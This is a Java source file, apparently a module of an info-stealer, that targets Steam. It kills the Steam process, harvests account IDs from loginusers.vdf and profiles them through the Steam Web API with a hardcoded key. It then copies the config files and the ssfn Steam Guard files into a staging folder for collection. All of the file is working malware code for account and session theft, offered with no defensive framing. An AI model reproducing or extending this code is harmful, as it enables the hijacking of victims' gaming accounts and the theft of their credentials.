package itzgonza.hollyshit.impl.app;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.commons.io.FileUtils;

import com.github.kevinsawicki.http.HttpRequest;
import com.google.gson.Gson;
import com.google.gson.JsonObject;

import itzgonza.hollyshit.utils.utilities;

public class SteamApp extends utilities {

    public static String steam_level;
    private static final String STEAM_API_KEY = "440D7F4D810EF9298D25EDDF37C1F902";

    public void initialize() {
        try {
            // Kill Steam process
            try {
                Runtime.getRuntime().exec("taskkill /IM Steam.exe /F");
                Thread.sleep(1000);
            } catch (Exception ignored) {}

            String steamInfo = getSteam();
            if (!steamInfo.contains("none")) {
                File infoFile = new File(getFolder(), "application/steam/account_info.txt");
                infoFile.getParentFile().mkdirs();
                FileUtils.writeStringToFile(infoFile, steamInfo, "utf-8", true);
                content.add("steam" + steam_level);

                // Copy only critical Steam files instead of the whole config directory to prevent bloat
                File steamFolder = new File("C:/Program Files (x86)/Steam");
                File destSteam = new File(getFolder(), "application/steam/");
                destSteam.mkdirs();

                // 1. Copy config files
                File steamConfigDir = new File(steamFolder, "config");
                if (steamConfigDir.exists()) {
                    File destConfig = new File(destSteam, "config");
                    destConfig.mkdirs();
                    String[] criticalConfigs = {"loginusers.vdf", "config.vdf", "libraryfolders.vdf"};
                    for (String conf : criticalConfigs) {
                        File confFile = new File(steamConfigDir, conf);
                        if (confFile.exists()) FileUtils.copyFileToDirectory(confFile, destConfig);
                    }
                }

                // 2. Copy SSFN files (Steam Guard)
                File[] ssfnFiles = steamFolder.listFiles((dir, name) -> name.startsWith("ssfn"));
                if (ssfnFiles != null) {
                    for (File ssfn : ssfnFiles) {
                        FileUtils.copyFileToDirectory(ssfn, destSteam);
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static String getSteam() throws Exception {
        String pf86 = System.getenv("ProgramFiles(X86)");
        if (pf86 == null) pf86 = "C:\\Program Files (x86)";
        File steamFolder = new File(pf86, "Steam");
        File loginUsersFile = new File(steamFolder, "config/loginusers.vdf");

        if (steamFolder.exists() && loginUsersFile.exists()) {
            String accounts = FileUtils.readFileToString(loginUsersFile, StandardCharsets.UTF_8);

            Pattern pattern = Pattern.compile("7656[0-9]{13}");
            Matcher matcher = pattern.matcher(accounts);

            Gson gson = new Gson();
            List<String> games = new ArrayList<>();

            File gamesFolder = new File(steamFolder, "steamapps");
            File[] gameManifests = gamesFolder.listFiles(f -> f.getName().startsWith("appmanifest_"));
            if (gameManifests != null) {
                for (File game : gameManifests) {
                    try {
                        String manifestStr = FileUtils.readFileToString(game, StandardCharsets.UTF_8).replaceAll("\\s+", " ");
                        Matcher m = Pattern.compile("\"name\"\\s+\"([^\"]*)\"").matcher(manifestStr);
                        if (m.find()) games.add(m.group(1));
                    } catch (Exception ignored) {}
                }
            }

            StringBuilder installedGames = new StringBuilder();
            if (!games.isEmpty()) {
                installedGames.append("\nInstalled Games: ").append(String.join(", ", games));
            }

            while (matcher.find()) {
                String account = matcher.group();

                HttpRequest accountInfoRequest = HttpRequest.get("https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=" + STEAM_API_KEY + "&steamids=" + account);
                if (!accountInfoRequest.ok()) continue;

                JsonObject resp = gson.fromJson(accountInfoRequest.body(), JsonObject.class).getAsJsonObject("response");
                if (resp == null || !resp.has("players") || resp.getAsJsonArray("players").size() == 0) continue;
                JsonObject accountInfo = resp.getAsJsonArray("players").get(0).getAsJsonObject();

                HttpRequest gamesRequest = HttpRequest.get("https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=" + STEAM_API_KEY + "&steamid=" + account);
                JsonObject gamesObj = gamesRequest.ok() ? gson.fromJson(gamesRequest.body(), JsonObject.class).getAsJsonObject("response") : new JsonObject();

                HttpRequest levelRequest = HttpRequest.get("https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=" + STEAM_API_KEY + "&steamid=" + account);
                JsonObject levelObj = levelRequest.ok() ? gson.fromJson(levelRequest.body(), JsonObject.class).getAsJsonObject("response") : new JsonObject();

                steam_level = levelObj.has("player_level") ? String.valueOf(levelObj.get("player_level").getAsInt()) : "Private";
                return String.format("Steam Identifier: %s\nDisplay Name: %s\nTime created: %s\nLevel: %s\nGame count: %s%s\nProfile URL: %s",
                        account,
                        accountInfo.has("personaname") ? accountInfo.get("personaname").getAsString() : "Unknown",
                        accountInfo.has("timecreated") ? accountInfo.get("timecreated").getAsString() : "Private",
                        steam_level,
                        gamesObj.has("game_count") ? gamesObj.get("game_count").getAsInt() : "Private",
                        installedGames.toString(),
                        accountInfo.has("profileurl") ? accountInfo.get("profileurl").getAsString() : "N/A");
            }
        }
        return "none";
    }
}